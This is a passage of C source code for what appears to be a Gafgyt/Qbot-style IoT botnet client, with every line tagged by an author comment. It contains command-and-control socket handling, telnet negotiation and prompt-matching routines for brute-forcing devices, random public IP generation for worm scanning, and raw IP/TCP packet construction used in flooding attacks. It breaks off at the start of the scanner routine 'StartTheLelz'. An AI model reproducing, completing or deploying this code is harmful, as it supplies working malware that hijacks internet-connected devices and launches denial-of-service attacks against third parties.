case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case '?': return !(*string && !wildString(pattern+1, string+1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint getHost(unsigned char *toGet, struct in_addr *i) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct hostent *h; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if((i->s_addr = inet_addr(toGet)) == -1) return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid uppercase(unsigned char *str) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*str) { *str = toupper(*str); str++; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint getBogos(unsigned char *bogomips) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int cmdline = open("/proc/cpuinfo", O_RDONLY); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char linebuf[4096]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(fdgets(linebuf, 4096, cmdline) != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uppercase(linebuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(linebuf, "BOGOMIPS") == linebuf) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *pos = linebuf + 8; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
strcpy(bogomips, pos); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(cmdline); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(linebuf, 0, 4096); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(cmdline); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint getCores() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int totalcores = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int cmdline = open("/proc/cpuinfo", O_RDONLY); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char linebuf[4096]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(fdgets(linebuf, 4096, cmdline) != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uppercase(linebuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(linebuf, 0, 4096); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(cmdline); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return totalcores; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid makeRandomStr(unsigned char *buf, int length) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint recvLine(int socket, unsigned char *buf, int bufsize) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(buf, 0, bufsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owofd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = 30; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(socket, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int selectRtn, retryCount; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(retryCount < 10) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "PING"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owotv.tv_sec = 30; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(socket, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
retryCount++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owobreak; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char tmpchr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *cp; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int count = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocp = buf; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(bufsize-- > 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(recv(mainCommSock, &tmpchr, 1, 0) != 1) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*cp = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*cp++ = tmpchr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(tmpchr == '\n') break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
count++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*cp = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo//      zprintf("recv: %s\n", cp); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn count; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint connectTimeout(int fd, char *host, int port, int timeout) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
socklen_t lon; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint valopt; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
long arg = fcntl(fd, F_GETFL, NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
arg |= O_NONBLOCK; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fd, F_SETFL, arg); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owodest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(getHost(host, &dest_addr.sin_addr)) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (res < 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (errno == EINPROGRESS) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = timeout; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
lon = sizeof(int); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (valopt) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoarg = fcntl(fd, F_GETFL, NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
arg &= (~O_NONBLOCK); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fd, F_SETFL, arg); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint listFork() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t parent, *newpids, i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
parent = fork(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (parent <= 0) return parent; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
numpids++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
newpids = (uint32_t*)malloc((numpids + 1) * 4); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
newpids[numpids - 1] = parent; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
free(pids); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pids = newpids; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return parent; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint negotiate(int sock, unsigned char *buf, int len) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char c; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoswitch (buf[1]) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case CMD_WILL: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case CMD_WONT: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case CMD_DO: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case CMD_DONT: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
c = CMD_IAC; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
send(sock, &c, 1, MSG_NOSIGNAL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (CMD_WONT == buf[1]) c = CMD_DONT; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else if (CMD_DONT == buf[1]) c = CMD_WONT; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
send(sock, &c, 1, MSG_NOSIGNAL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
send(sock, &(buf[2]), 1, MSG_NOSIGNAL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owodefault: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint matchPrompt(char *bufStr) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *prompts = ":>%$#\0"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint bufLen = strlen(bufStr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i, q = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < strlen(prompts); i++) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(*(bufStr + bufLen - q) == prompts[i]) return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int bufferUsed = initialIndex, got = 0, found = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = timeout; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = timeoutusec; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *initialRead = NULL; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
initialRead = buffer + bufferUsed; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
got = recv(fd, initialRead, 1, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(got == -1 || got == 0) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
bufferUsed += got; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(*initialRead == 0xFF) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
got = recv(fd, initialRead + 1, 2, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(got == -1 || got == 0) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
bufferUsed += got; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!negotiate(fd, initialRead, 3)) return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(found) return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic uint8_t ipState[5]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
in_addr_t getRandomPublicIP() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255 && ipState[4] < 255) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[1]++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[2]++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[3]++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[4]++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char ip[16]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return inet_addr(ip); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoipState[1] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[2] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[3] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[4] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while( // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 0) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 10) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 127) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 169 && ipState[2] == 254) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 192 && ipState[2] == 168) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) || // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(ipState[1] >= 224) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[1] = rand() % 150; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[2] = rand() % 150; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[3] = rand() % 150; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
ipState[4] = rand() % 150; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owochar ip[16]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return inet_addr(ip); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoin_addr_t getRandomIP(in_addr_t netmask) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return tmp ^ ( rand_cmwc() & ~netmask); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned short csum (unsigned short *buf, int count) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register uint64_t sum = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while( count > 1 ) { sum += *buf++; count -= 2; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(count > 0) { sum += *(unsigned char *)buf; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return (uint16_t)(~sum); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct tcp_pseudo // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned long src_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned long dst_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char zero; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char proto; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned short length; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} pseudohead; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned short total_len = iph->tot_len; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pseudohead.src_addr=iph->saddr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pseudohead.dst_addr=iph->daddr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pseudohead.zero=0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pseudohead.proto=IPPROTO_TCP; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pseudohead.length=htons(sizeof(struct tcphdr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned short *tcp = malloc(totaltcp_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned short output = csum(tcp,totaltcp_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
free(tcp); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return output; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->ihl = 5; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->version = 4; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->tos = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->tot_len = sizeof(struct iphdr) + packetSize; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->id = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->frag_off = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->ttl = MAXTTL; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->protocol = protocol; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->check = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->saddr = source; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->daddr = dest; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint sclose(int fd) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(3 > fd) return 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid StartTheLelz() // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int max = (getdtablesize() / 4) * 3, i, res; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
socklen_t lon; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int valopt; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomax = max > 4096 ? 4096 : max; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
